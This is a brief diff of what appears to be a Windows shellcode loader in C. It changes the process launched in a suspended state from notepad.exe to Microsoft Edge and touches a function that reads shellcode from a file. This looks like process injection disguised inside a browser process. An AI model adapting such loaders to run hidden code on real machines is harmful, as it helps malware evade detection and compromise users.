@@ -96,7 +96,7 @@ BOOL LaunchnotepadAndGetPID(OUT PROCESS_INFORMATION* pi) {
 
 	si.cb = sizeof(si);
 
-	if (!CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, pi)) {
+	if (!CreateProcessA("C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, pi)) {
 		printf("[-] Fucked!\n");
 		return FALSE;
 	}
@@ -140,7 +140,6 @@ BOOL ReadShellcodeFile(CHAR* shellcodeName, LPVOID* shellcode, SIZE_T* shellcode
 	CloseHandle(hFile);
 	return TRUE;
 }
-
 
 
 
